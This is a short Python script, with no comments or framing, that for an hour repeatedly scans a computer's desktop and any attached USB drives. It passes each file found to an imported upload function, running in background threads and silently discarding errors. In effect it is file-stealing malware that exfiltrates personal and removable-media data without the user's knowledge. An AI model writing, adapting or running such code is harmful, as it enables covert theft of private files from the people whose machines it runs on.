import threading
from concurrent.futures import ThreadPoolExecutor
import time
from upload import uploadf
from filescanner import scan_files, limitFileSize, getUsb, get_desktop
import os

def trycall(call, *arg, **kw):
    try:
        return call(*arg, **kw)
    except:
        pass

def sleep():
    time.sleep(60)
pool = ThreadPoolExecutor(max_workers=2)
lock = threading.Lock()
af = []
gf = []

def Uf_(path):
    if not os.path.exists(path[0]):
        return
    with lock:
        if (path in af) or (path in gf):
            return
        gf.append(path)
    try:
        uploadf(path[0])
        with lock:
            af.append(path)
            gf.remove(path)
    except:
        with lock:
            gf.remove(path)

def Uf(path):
    with lock:
        if (path in af) or (path in gf):
            return
    trycall(Uf_, path)

def s(D):
    fs = limitFileSize(scan_files(D))
    for path in fs:
        pool.submit(Uf, path)


desktop = get_desktop()
def sD():
    s(desktop)

def sU():
    U = getUsb()
    if not U:
        return
    for u in U:
        s(u[0])

def tU():
    for i in range(60):
        sU()
        print(i)
        sleep()

def tD():
    for i in range(60):
        sD()
        print(i)
        sleep()

t1 = threading.Thread(target=tU, daemon=True)
t2 = threading.Thread(target=tD, daemon=True)
t1.start()
t2.start()

time.sleep(3600)
